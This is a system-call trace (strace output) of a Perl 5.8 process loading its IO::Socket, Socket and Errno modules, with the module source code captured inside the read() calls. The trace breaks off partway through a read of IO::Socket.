11891 07:39:45.184158 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
11891 07:39:45.184494 stat64("/etc/perl/Socket.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.190148 stat64("/etc/perl/Socket.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.190164 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.190181 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.190195 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.190208 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.190222 stat64("/usr/lib/perl5/Socket.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.190233 stat64("/usr/lib/perl5/Socket.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.190247 stat64("/usr/share/perl5/Socket.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.190259 stat64("/usr/share/perl5/Socket.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.190272 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.190284 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
11891 07:39:45.190305 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.190319 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.190331 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.190349 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
11891 07:39:45.190788 brk(0x8239000)    = 0x8239000
11891 07:39:45.190996 read(8, "", 4096) = 0
11891 07:39:45.191011 close(8)          = 0
11891 07:39:45.191099 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
11891 07:39:45.191124 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
11891 07:39:45.191155 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
11891 07:39:45.191170 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
11891 07:39:45.191261 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
11891 07:39:45.191280 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d89000
11891 07:39:45.191295 mmap2(0xb7d8e000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d8e000
11891 07:39:45.191310 close(8)          = 0
11891 07:39:45.191867 brk(0x825a000)    = 0x825a000
11891 07:39:45.201412 stat64("/etc/perl/Errno.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.201430 stat64("/etc/perl/Errno.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.201444 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.201457 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.201470 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.201483 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.201496 stat64("/usr/lib/perl5/Errno.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.201508 stat64("/usr/lib/perl5/Errno.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.201526 stat64("/usr/share/perl5/Errno.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.201538 stat64("/usr/share/perl5/Errno.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.201551 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.201582 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
11891 07:39:45.201650 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.201664 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.201693 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.201712 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
11891 07:39:45.202487 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
11891 07:39:45.202982 _llseek(8, 5966, [5966], SEEK_SET) = 0
11891 07:39:45.202998 _llseek(8, 0, [5966], SEEK_CUR) = 0
11891 07:39:45.203009 close(8)          = 0
11891 07:39:45.203427 brk(0x827b000)    = 0x827b000
11891 07:39:45.203552 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    